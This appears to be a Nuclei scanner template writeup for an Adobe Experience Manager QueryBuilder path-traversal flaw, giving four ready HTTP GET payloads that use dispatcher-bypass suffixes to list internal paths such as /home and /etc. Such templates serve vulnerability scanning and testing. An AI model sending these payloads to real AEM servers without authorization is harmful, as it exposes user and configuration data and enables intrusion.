# Nuclei Template: AEM QueryBuilder Internal Path Read
**Template ID:** aem-querybuilder-internal-path-read
**Vulnerability Class:** Path Traversal
**Severity:** Medium
**CWE:** CWE-22
**Source:** Nuclei Template (`aem-querybuilder-internal-path-read.yaml`)

## Vulnerability Information & PoC

## Description
AEM QueryBuilder is vulnerable to LFI.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/bin/querybuilder.json.;%0aa.css?path=/home&p.hits=full&p.limit=-1
GET {{BaseURL}}/bin/querybuilder.json.;%0aa.css?path=/etc&p.hits=full&p.limit=-1
GET {{BaseURL}}/bin/querybuilder.json.css?path=/home&p.hits=full&p.limit=-1
GET {{BaseURL}}/bin/querybuilder.json.css?path=/etc&p.hits=full&p.limit=-1
```

## References
- https://speakerdeck.com/0ang3el/aem-hacker-approaching-adobe-experience-manager-webapps-in-bug-bounty-programs?slide=91
